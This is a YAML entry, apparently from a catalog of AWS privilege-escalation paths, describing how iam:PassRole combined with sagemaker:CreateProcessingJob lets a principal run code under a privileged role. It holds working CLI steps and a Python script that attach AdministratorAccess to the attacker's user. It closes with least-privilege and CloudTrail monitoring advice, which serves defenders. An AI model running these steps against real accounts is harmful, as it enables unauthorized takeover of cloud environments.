id: sagemaker-003
name: iam:PassRole + sagemaker:CreateProcessingJob
category: new-passrole
services:
- iam
- sagemaker
description: A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing script, the attacker can execute code with elevated privileges.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store input/output data
  lateral:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - An S3 bucket must be accessible to store input/output data
exploitationSteps:
  awscli:
  - step: 1
    command: |
      echo '#!/usr/bin/env python3
      import boto3
      iam = boto3.client("iam")
      iam.attach_user_policy(
          UserName="YOUR_USERNAME",
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      ' > exploit.py
    description: Create a malicious processing script that attaches AdministratorAccess policy to your user
  - step: 2
    command: 'aws s3 cp exploit.py s3://BUCKET_NAME/scripts/exploit.py

      '
    description: Upload the malicious script to S3
  - step: 3
    command: |
      aws sagemaker create-processing-job \
        --processing-job-name privesc-processing \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --app-specification '{"ImageUri":"683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3","ContainerEntrypoint":["python3"],"ContainerArguments":["/opt/ml/processing/input/code/exploit.py"]}' \
        --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/scripts/","LocalPath":"/opt/ml/processing/input/code","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
        --processing-output-config '{"Outputs":[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output/","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]}' \
        --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":10}}'
    description: Create a processing job with the privileged role that executes the malicious Python script
  - step: 4
    command: aws sagemaker describe-processing-job --processing-job-name privesc-processing
    description: Monitor the processing job status and wait for execution
recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does a SageMaker processing job need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "sagemaker.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual SageMaker processing job creation followed by immediate execution
  - Monitor CloudTrail for processing job creation by principals who do not usually create processing jobs
  - Monitor CloudTrail for roles being passed to SageMaker that haven't been used before
  - Monitor and alert on SageMaker processing job creation with privileged roles
  - Regularly audit SageMaker processing jobs for excessive IAM permissions
  - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.

  '
